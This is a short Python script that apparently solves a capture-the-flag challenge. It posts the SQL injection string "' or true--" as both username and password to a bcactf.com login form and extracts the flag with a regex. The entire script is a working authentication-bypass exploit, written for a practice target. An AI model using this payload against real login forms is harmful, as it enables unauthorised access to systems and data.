#!/usr/bin/python3

import re

import requests

url = "http://web.bcactf.com:49153/"

payload = {	"Username": "' or true--",
			"Password": "' or true--" }

r = requests.post(url, data = payload)


#print(r.text)
print(re.findall("bcactf{.*}", r.text)[0])